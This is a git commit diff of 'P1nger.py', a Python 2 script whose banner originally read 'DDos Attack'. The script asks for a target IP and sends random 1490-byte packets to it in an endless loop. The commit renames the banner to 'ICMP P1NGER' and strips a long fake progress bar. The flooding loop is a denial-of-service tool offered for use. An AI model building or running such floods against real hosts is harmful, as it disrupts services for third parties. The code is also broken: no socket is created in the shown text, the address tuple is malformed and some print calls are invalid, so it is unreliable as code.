4957c3b1886efee40650a20ebc33badca818bab0
DeaKenas <73515265+DeaKenas@users.noreply.github.com>
2021-05-15 22:40:49 -0700

    Update P1nger.py

--- P1nger.py
+++ P1nger.py
@@ -1,12 +1,12 @@
 #Feel free to look at all of the code
-#Still in development
+#More updates later
 
 import sys
 import os
 import time
 import socket
 import random
-#Time
+#Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -21,7 +21,7 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet ICMP P1NGER")
 print
 print("$$$$$$$\   $$\                                       ")
 print("$$  __$$\$$$$ |                                      ")
@@ -37,290 +37,12 @@ print("                          \______/                   ")
 print("Thanks for using my custom pinger!")
 print"By DeaKenas"
 print
-ip = raw_input("P1NGER Target   : ")
+ip = raw_input(" Target : ")
 
 os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 0% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print ("[##=================================================================================================] 2% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[###=================================================================================================] 3% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[####================================================================================================] 4% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[#####==============================================================================================] 5% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[######==============================================================================================] 6% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[########============================================================================================] 7% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[########============================================================================================] 8% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[#########===========================================================================================] 9% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[##########==========================================================================================] 10% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 11% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 12% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 13% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 14% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 15% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 16% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 17% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 18% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 19% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 20% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 21% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 22% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 23% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 24% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 25% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 26% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 27% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 28% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 29% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 30% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 31% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 32% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 33% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 34% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 35% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 36% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 37% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 38% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 39% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 40% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 41% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 42% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 43% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 44% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 45% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 46% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 47% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 48% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 49% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 50% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 51% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 52% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 53% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 57% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 62% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 64% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 69% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 70% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 72% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 74% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 75% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 78% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 81% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 83% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 85% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 86% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 91% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 96% "
-time.sleep(0)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 99% "
-time.sleep(1)
-os.system("clear")
-os.system("P1NGER Session Starting")
-print "[====================================================================================================] 100% "
-time.sleep(0)
+os.system("figlet ICMP P1NGER")
+sent = 0
 while True:
-     sock.sendto(bytes, (ip,))
+     sock.sendto(bytes, (ip))
      sent = sent + 1
-     port = port + 1
-     print "P1NGED %s packets to %s "%(sent,ip)
+     print " %s packet to %s "%(sent,ip)
